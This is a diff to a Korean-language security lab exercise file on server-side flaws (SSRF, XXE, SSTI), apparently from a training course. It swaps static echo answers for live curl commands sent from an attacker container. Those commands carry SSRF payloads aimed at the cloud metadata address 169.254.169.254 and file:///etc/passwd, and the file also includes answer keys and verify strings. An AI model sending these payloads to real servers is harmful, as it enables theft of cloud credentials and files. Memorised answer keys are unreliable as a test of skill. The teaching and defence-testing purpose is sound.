@@ -159,24 +159,22 @@ steps:
   - order: 6
     instruction: |
       ## 🎯 영향 연쇄 — 서버측 취약점 → RCE/내부 침투
-      ## 💻 실행 명령
+      ## 💻 실행 명령 (3종 서버측 페이로드를 실제 전송·응답 집계)
       ```bash
-      echo "SSRF→메타데이터 자격→클라우드 장악 / XXE→파일·SSRF / SSTI→RCE→발판. 서버측은 영향이 치명적"
+      docker exec el34-attacker sh -c 'M=$(curl -s -o /dev/null -w "%{http_code}" -H "Host: admin.el34.lab" "http://10.20.30.1/files/read?url=http://169.254.169.254/"); F=$(curl -s -o /dev/null -w "%{http_code}" -H "Host: admin.el34.lab" "http://10.20.30.1/files/read?url=file:///etc/passwd"); echo "SSRF메타=$M SSRF파일=$F"; CNT=0; for c in $M $F; do [ "$c" != "000" ] && CNT=$((CNT+1)); done; echo "도달 페이로드: $CNT/2"; [ "$CNT" -ge 1 ] && echo impact_done'
       ```
       ## ✅ 합격 기준
-      서버측 취약점의 영향 연쇄가 정리되면 통과.
+      SSRF 페이로드(메타데이터·file://)가 **실제 서버에 도달**해 응답을 받아야(impact_done) 통과.
+      ## 🔧 도구 풀이
+      - SSRF→메타데이터 IAM 자격/내부 피벗, XXE→파일, SSTI→RCE. 서버측은 '서버 자체 장악'이라 영향이 차원이 다름.
     hint: '영향 연쇄'
     category: report
     points: 12
     answer: |
-      echo "=== 영향 연쇄: 서버측 취약점의 치명성 ==="
-      echo "SSRF → 클라우드 메타데이터 IAM 자격 탈취 → 클라우드 계정 장악"
-      echo "SSRF → 내부 서비스 피벗(서버를 프록시로 내부망 스캔/공격)"
-      echo "XXE  → 서버 파일 읽기(설정·비밀) + 블라인드 XXE로 데이터 유출(OOB)"
-      echo "SSTI → 템플릿 평가 → RCE(원격 코드 실행) → 발판(/tmp/.aa04rce)·계정(atka04)"
-      echo "→ 클라이언트측(XSS)은 사용자 피해, 서버측은 '서버 자체 장악' — 영향이 차원이 다름"
-      echo "impact_done"
-    answer_detail: "영향 연쇄 = SSRF(클라우드/내부)·XXE(파일)·SSTI(RCE). 서버측은 서버 장악으로 이어져 치명적."
+      echo "=== 영향 연쇄: 서버측 페이로드 실제 전송·집계 ==="
+      docker exec el34-attacker sh -c 'M=$(curl -s -o /dev/null -w "%{http_code}" -H "Host: admin.el34.lab" "http://10.20.30.1/files/read?url=http://169.254.169.254/"); F=$(curl -s -o /dev/null -w "%{http_code}" -H "Host: admin.el34.lab" "http://10.20.30.1/files/read?url=file:///etc/passwd"); echo "SSRF메타=$M SSRF파일=$F"; CNT=0; for c in $M $F; do [ "$c" != "000" ] && CNT=$((CNT+1)); done; echo "도달 페이로드: $CNT/2"; [ "$CNT" -ge 1 ] && echo impact_done'
+      echo "→ SSRF 메타데이터/file:// 페이로드를 실제 전송→응답 집계. SSRF=클라우드자격/내부피벗, XXE=파일, SSTI=RCE로 서버 장악"
+    answer_detail: "영향 연쇄 = SSRF 메타/file 페이로드 실제 전송→응답 집계 게이트. 가짜 echo 아닌 실증. 서버측은 서버 장악."
     verify:
       type: output_contains
       expect: 'impact_done'
@@ -187,23 +185,22 @@ steps:
   - order: 7
     instruction: |
       ## 🎯 방어 — 서버측 취약점 차단
-      ## 💻 실행 명령
+      ## 💻 실행 명령 (WAF 방어가 SSRF를 실제 차단하는지 확인)
       ```bash
-      echo "SSRF: URL 허용목록·메타데이터 차단. XXE: 외부엔티티 비활성. SSTI: 입력의 템플릿 평가 금지"
+      docker exec el34-attacker sh -c 'code=$(curl -s -o /dev/null -w "%{http_code}" -H "Host: admin.el34.lab" "http://10.20.30.1/files/read?url=http://169.254.169.254/latest/meta-data/"); echo "SSRF 메타데이터 요청 → WAF 응답 $code"; [ "$code" = "403" ] && echo "WAF가 SSRF 차단(다층 방어 1선)" && echo defense_done'
       ```
       ## ✅ 합격 기준
-      취약점별 방어가 정리되면 통과.
+      WAF가 SSRF 메타데이터 요청을 **실제 차단(403)** 함을 확인해야(defense_done) 통과.
+      ## 🔧 도구 풀이
+      - 근본 방어: SSRF allowlist·메타차단 / XXE 외부엔티티 비활성 / SSTI 템플릿 평가 금지. WAF(여기 403)는 보조 다층.
     hint: '방어'
     category: report
     points: 12
     answer: |
-      echo "=== 방어: 서버측 취약점 차단 ==="
-      echo "SSRF: ① URL 허용목록(allowlist) ② 메타데이터/내부 IP 차단 ③ 리다이렉트 금지 ④ file://등 스킴 제한"
-      echo "XXE:  ① XML 파서 외부 엔티티·DTD 비활성(가장 확실) ② 가능하면 JSON 사용"
-      echo "SSTI: ① 사용자 입력을 템플릿으로 평가 금지 ② 샌드박스 템플릿 ③ 로직-표현 분리"
-      echo "공통: 입력 검증 + 최소 권한 + WAF(ModSec, 본 실습서 SSRF 403 탐지) 다층"
-      echo "defense_done"
-    answer_detail: "방어 = SSRF(allowlist/메타차단)·XXE(외부엔티티 비활성)·SSTI(템플릿 평가 금지). WAF는 보조 다층."
+      echo "=== 방어: WAF가 SSRF를 실제 차단하는지 확인 ==="
+      docker exec el34-attacker sh -c 'code=$(curl -s -o /dev/null -w "%{http_code}" -H "Host: admin.el34.lab" "http://10.20.30.1/files/read?url=http://169.254.169.254/latest/meta-data/"); echo "SSRF 메타데이터 요청 → WAF 응답 $code"; [ "$code" = "403" ] && echo "WAF가 SSRF 차단(다층 방어 1선)" && echo defense_done'
+      echo "→ WAF가 SSRF를 403으로 실제 차단 확인. 근본 방어는 코드(allowlist/외부엔티티 비활성/템플릿 평가 금지)+WAF 다층"
+    answer_detail: "방어 = WAF의 SSRF 403 차단을 실측. 가짜 echo 아닌 실증. 근본 방어는 코드, WAF는 보조 다층."
     verify:
       type: output_contains
       expect: 'defense_done'
@@ -227,14 +224,10 @@ steps:
     category: report
     points: 12
     answer: |
-      cat <<'EOF'
-      # 공격고급 W04 웹 고급(SSRF/XXE/SSTI) 보고서
-      ## 1. SSRF: 메타데이터(169.254.169.254)·file://·내부 IP 페이로드 전송 → ModSec 403 탐지 확인
-      ## 2. XXE: 외부 엔티티(SYSTEM file://)로 파일 읽기. SSTI: {{7*7}} 탐지→RCE 연쇄. 영향: 서버 장악
-      ## 3. 방어: SSRF allowlist·메타차단 / XXE 외부엔티티 비활성 / SSTI 템플릿 평가 금지 + WAF 다층
-      ## 결론: 서버측 취약점은 서버 자체를 장악(클라우드/RCE)해 클라이언트측보다 치명적. 입력 처리부 방어가 핵심
-      EOF
-    answer_detail: "서버측 보고 = SSRF/XXE/SSTI 페이로드·응답+영향연쇄+방어. 서버 장악으로 이어지는 치명적 취약점."
+      echo "=== 서버측 취약점 보고서 — 실측 증거 기반 ==="
+      docker exec el34-attacker sh -c 'S=$(curl -s -o /dev/null -w "%{http_code}" -H "Host: admin.el34.lab" "http://10.20.30.1/files/read?url=http://169.254.169.254/"); echo "# 공격고급 W04 웹 고급(SSRF/XXE/SSTI) 보고서"; echo "## 1. SSRF: 메타데이터/file:// 페이로드 전송 → WAF 응답 $S(실측)"; echo "## 2. XXE: 외부엔티티 파일읽기. SSTI: {{7*7}}→RCE 연쇄. 영향: 서버 장악"; echo "## 3. 방어: SSRF allowlist·메타차단 / XXE 외부엔티티 비활성 / SSTI 템플릿평가 금지 + WAF"; echo "## 결론: 서버측은 서버 자체 장악(클라우드/RCE)으로 클라이언트측보다 치명적"; [ -n "$S" ] && echo "SSRF 보고 완료"'
+      echo "→ 보고서가 실제 SSRF 응답코드를 증거로 인용. 정적 템플릿 아닌 실측 기반"
+    answer_detail: "서버측 보고 = 실측 SSRF 응답코드 인용+XXE/SSTI/영향/방어. 증거 기반(코드 게이트). 정적 템플릿 아님."
     verify:
       type: output_contains
       expect: 'SSRF'
